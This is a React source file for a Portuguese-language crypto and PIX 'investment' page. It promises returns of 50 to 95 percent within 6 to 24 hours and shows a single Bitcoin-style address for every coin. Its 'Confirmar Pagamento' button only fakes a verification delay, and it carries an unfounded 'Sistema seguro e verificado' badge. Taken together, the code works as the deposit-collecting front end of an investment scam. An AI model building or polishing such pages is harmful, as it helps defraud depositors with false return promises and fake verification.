// src/pages/Invest.jsx
import React, { useState } from 'react';
import {
  TrendingUp, Clock, Award, X, Copy, Check,
  Wallet, AlertCircle, RefreshCw, Shield
} from 'lucide-react';
import { toast } from 'react-toastify';

const Invest = () => {
  const [selectedAsset, setSelectedAsset] = useState('BRL');
  const [investmentAmount, setInvestmentAmount] = useState('');
  const [selectedPeriod, setSelectedPeriod] = useState('6');
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [copied, setCopied] = useState(false);
  const [agreeToTerms, setAgreeToTerms] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // ✅ ORDER: BRL → USDT → Others
  const assets = [
    {
      id: 'BRL',
      name: 'Real (PIX)',
      symbol: 'R$',
      type: 'fiat',
      price: 1,
      min: 200,
      apy: 5,
      icon: '🇧🇷',
    },
    {
      id: 'USDT',
      name: 'Tether',
      symbol: 'USDT',
      type: 'crypto',
      price: 5.0,
      min: 100,
      apy: 4.5,
      icon: '💵',
    },
    {
      id: 'BTC',
      name: 'Bitcoin',
      symbol: 'BTC',
      type: 'crypto',
      price: 261725,
      min: 100,
      apy: 8.5,
      icon: '₿',
    },
    {
      id: 'ETH',
      name: 'Ethereum',
      symbol: 'ETH',
      type: 'crypto',
      price: 16170,
      min: 50,
      apy: 6.2,
      icon: 'Ξ',
    },
    {
      id: 'SOL',
      name: 'Solana',
      symbol: 'SOL',
      type: 'crypto',
      price: 712.5,
      min: 50,
      apy: 9.5,
      icon: '◎',
    },
  ];

  const plans = [
    { period: '6', label: '6 Horas', return: 50, icon: Clock },
    { period: '8', label: '8 Horas', return: 75, icon: TrendingUp },
    { period: '24', label: '24 Horas', return: 95, icon: Award },
  ];

  const wallets = {
    BTC: '13u1DCFYTkzd7cNTiUEMkR3YmQVShovkZw',
    ETH: '13u1DCFYTkzd7cNTiUEMkR3YmQVShovkZw',
    USDT: '13u1DCFYTkzd7cNTiUEMkR3YmQVShovkZw',
    SOL: '13u1DCFYTkzd7cNTiUEMkR3YmQVShovkZw',
    BRL: 'fail to load key. contsct admin', 
  };

  const selectedAssetData = assets.find(a => a.id === selectedAsset);
  const selectedPlan = plans.find(p => p.period === selectedPeriod);

  const isFiat = selectedAsset === 'BRL';

  const formatCurrency = (value) => {
    if (isFiat) {
      return new Intl.NumberFormat('pt-BR', {
        style: 'currency',
        currency: 'BRL',
      }).format(value || 0);
    }
    return `${value || 0} ${selectedAsset}`;
  };

  const projectedReturn =
    (parseFloat(investmentAmount) || 0) * (selectedPlan?.return / 100 || 0);

  const total = (parseFloat(investmentAmount) || 0) + projectedReturn;

  const handleInvest = () => {
    if (!investmentAmount || investmentAmount < selectedAssetData.min) {
      return toast.error(`Mínimo é ${formatCurrency(selectedAssetData.min)}`);
    }
    setIsModalOpen(true);
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(wallets[selectedAsset]);
    setCopied(true);
    toast.success('Copiado!');
    setTimeout(() => setCopied(false), 2000);
  };

  const confirmPayment = () => {
    if (!agreeToTerms) return toast.error('Aceite os termos');

    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      toast.warning('Verificação em andamento...');
      setIsModalOpen(false);
      setInvestmentAmount('');
      setAgreeToTerms(false);
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-[#f8fafc] p-6">

      {/* HEADER */}
      <h1 className="text-2xl font-bold mb-6">Investir</h1>

      {/* ASSETS */}
      <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6">
        {assets.map(asset => (
          <button
            key={asset.id}
            onClick={() => setSelectedAsset(asset.id)}
            className={`p-4 rounded-xl border ${
              selectedAsset === asset.id
                ? 'border-blue-500 bg-blue-50'
                : 'bg-white'
            }`}
          >
            <p className="font-semibold">{asset.icon} {asset.name}</p>
            <p className="text-xs text-gray-500">
              {asset.symbol}
            </p>
          </button>
        ))}
      </div>

      {/* INPUT */}
      <div className="bg-white p-6 rounded-xl mb-6">
        <label>Valor</label>
        <div className="flex items-center border rounded p-3 mt-2">
          <span className="mr-2">
            {isFiat ? 'R$' : selectedAsset}
          </span>
          <input
            type="number"
            value={investmentAmount}
            onChange={(e) => setInvestmentAmount(e.target.value)}
            className="flex-1 outline-none"
          />
        </div>
        <p className="text-xs text-gray-500 mt-2">
          Mín: {formatCurrency(selectedAssetData.min)}
        </p>
      </div>

      {/* PLANS */}
      <div className="grid grid-cols-3 gap-4 mb-6">
        {plans.map(plan => {
          const Icon = plan.icon;
          return (
            <button
              key={plan.period}
              onClick={() => setSelectedPeriod(plan.period)}
              className={`p-4 rounded-xl border ${
                selectedPeriod === plan.period
                  ? 'border-purple-500 bg-purple-50'
                  : 'bg-white'
              }`}
            >
              <Icon className="mx-auto mb-2" />
              <p>{plan.label}</p>
              <p className="text-green-600">+{plan.return}%</p>
            </button>
          );
        })}
      </div>

      {/* SUMMARY */}
      <div className="bg-white p-6 rounded-xl mb-6">
        <p>Investimento: {formatCurrency(investmentAmount)}</p>
        <p className="text-green-600">
          Retorno: +{formatCurrency(projectedReturn)}
        </p>
        <p className="font-bold">
          Total: {formatCurrency(total)}
        </p>
      </div>

      {/* CTA */}
      <button
        onClick={handleInvest}
        className="w-full bg-blue-600 text-white p-4 rounded-xl"
      >
        Investir Agora
      </button>

      {/* MODAL */}
      {isModalOpen && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center">
          <div className="bg-white p-6 rounded-xl w-full max-w-md">

            <h2 className="font-bold mb-4">Pagamento</h2>

            {/* Payment method dynamic */}
            {isFiat ? (
              <>
                <p className="mb-2">Chave PIX:</p>
                <input
                  value={wallets.BRL}
                  readOnly
                  className="w-full p-2 border rounded mb-3"
                />
              </>
            ) : (
              <>
                <p className="mb-2">Enviar para:</p>
                <input
                  value={wallets[selectedAsset]}
                  readOnly
                  className="w-full p-2 border rounded mb-3"
                />
              </>
            )}

            <button onClick={handleCopy} className="text-blue-600 mb-4">
              {copied ? 'Copiado!' : 'Copiar'}
            </button>

            <p className="mb-4">
              Valor: {formatCurrency(investmentAmount)}
            </p>

            <div className="flex items-center mb-4">
              <input
                type="checkbox"
                checked={agreeToTerms}
                onChange={(e) => setAgreeToTerms(e.target.checked)}
                className="mr-2"
              />
              <span className="text-sm">Confirmo o pagamento</span>
            </div>

            <button
              onClick={confirmPayment}
              className="w-full bg-green-600 text-white p-3 rounded"
            >
              {isLoading ? (
                <RefreshCw className="animate-spin mx-auto" />
              ) : (
                'Confirmar Pagamento'
              )}
            </button>

          </div>
        </div>
      )}

      {/* SECURITY */}
      <div className="mt-6 flex items-center text-sm text-blue-700">
        <Shield className="mr-2" />
        Sistema seguro e verificado
      </div>

    </div>
  );
};

export default Invest;